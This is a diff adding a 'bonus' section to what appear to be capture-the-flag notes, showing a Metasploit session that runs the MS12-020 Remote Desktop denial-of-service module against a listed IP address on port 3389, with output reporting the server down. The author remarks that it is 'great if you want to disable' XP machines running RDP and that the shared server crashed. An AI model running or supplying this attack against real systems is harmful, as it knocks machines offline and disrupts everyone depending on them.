@@ -101,4 +101,29 @@ meterpreter > getsystem
 DONE. that was easier than expected
 
 
+BONUS: DENIAL OF SERVICE. 
+use this to BSOD the machine
+useless for the purposes of CTF but great if you want to disable
+an XP machine running RDP on port 3389:
+
+msf auxiliary(ms12_020_maxchannelids) > show options
+
+Module options (auxiliary/dos/windows/rdp/ms12_020_maxchannelids):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   RHOST  212.129.29.185   yes       The target address
+   RPORT  3389             yes       The target port (TCP)
+
+msf auxiliary(ms12_020_maxchannelids) > exploit
+
+[*] 212.129.29.185:3389 - 212.129.29.185:3389 - Sending MS12-020 Microsoft Remote Desktop Use-After-Free DoS
+[*] 212.129.29.185:3389 - 212.129.29.185:3389 - 210 bytes sent
+[*] 212.129.29.185:3389 - 212.129.29.185:3389 - Checking RDP status...
+[+] 212.129.29.185:3389 - 212.129.29.185:3389 seems down
+[*] Auxiliary module execution completed
+
+server crashed after this. appologies to anyone else on at the time.
+
+
 
